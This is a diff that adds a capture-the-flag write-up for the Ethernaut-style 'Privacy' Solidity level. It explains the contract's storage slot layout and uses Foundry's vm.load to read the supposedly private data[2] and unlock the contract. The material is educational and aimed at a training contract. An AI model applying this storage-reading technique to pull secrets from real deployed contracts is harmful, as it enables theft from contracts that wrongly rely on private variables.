@@ -680,3 +680,76 @@ function isLastFloor(uint256) external returns (bool) {
 ### References
 
 * https://docs.soliditylang.org/en/v0.8.19/types.html#booleans
+
+
+## 12 Privacy
+
+To beat this level, we need to comply with
+
+```solidity
+instance.locked() == false;
+```
+
+### Solution
+
+When the level is created, some data is added:
+
+```solidity
+data[0] = keccak256(abi.encodePacked(tx.origin,"0"));
+data[1] = keccak256(abi.encodePacked(tx.origin,"1"));
+data[2] = keccak256(abi.encodePacked(tx.origin,"2"));
+Privacy instance = new Privacy(data);
+```
+
+To unlock the level, we most know teh value of `data[2]`.
+
+```solidity
+function unlock(bytes16 _key) public {
+  require(_key == bytes16(data[2]));
+  locked = false;
+}
+```
+
+Recall that the blockchain is public, see the [solution](#solution-9) of [08 Vault](#08-vault), we just use the cheat code `vm.load()`, which wouldn't work on-chain, but would surely work within a forge script in a real world situation.
+
+So far so good, _but_ we want to know which slot to look at! See the contract
+
+```solidity
+bool public locked = true;
+uint256 public ID = block.timestamp;
+uint8 private flattening = 10;
+uint8 private denomination = 255;
+uint16 private awkwardness = uint16(block.timestamp);
+bytes32[3] private data;
+```
+
+A naive printing of all the slots give us
+
+```
+  0x0000000000000000000000000000000000000000000000000000000000000001
+  0x0000000000000000000000000000000000000000000000000000000063d6fbd8
+  0x00000000000000000000000000000000000000000000000000000000fbd8ff0a
+  0x975099e616af13d803200fe3021618182d07cd86f4d97d964923f15b796cf4b0
+  0x2d48f4cbf31471c4a6df3f8b788f360df656dce2a0fed8c986cd3e4c22d621aa
+  0x1a3aac5aaec2ef75fc3b36881192322fb7c2a2a6cfa0ace1715ad96c8d6db624
+```
+
+We can see that the variables are stored in an optimized way, with,
+
+* slot 0: `bool public locked`.
+* slot 1: `uint256 public ID`. The reason there are so maby zeroes is the assigning of `block.timestamp`.
+* slot 2: `uint16 private awkwardness`, `uint8 private denomination `, `uint8 private flattening`. Pay attention at the order they are stored.
+* slot 3: `bytes32[3] private data`, element `0`
+* slot 4: `bytes32[3] private data`, element `1`
+* slot 5: `bytes32[3] private data`, element `2`
+
+Since `unlock()` needs `data[2]`, we are looking at the slot 5:
+
+```solidity
+// variables of this data array are at slots 3, 4, and 5
+bytes16 key = bytes16(vm.load(challengeAddress, bytes32(uint256(5))));
+```
+
+### References
+
+ https://docs.soliditylang.org/en/v0.8.18/internals/layout_in_storage.html
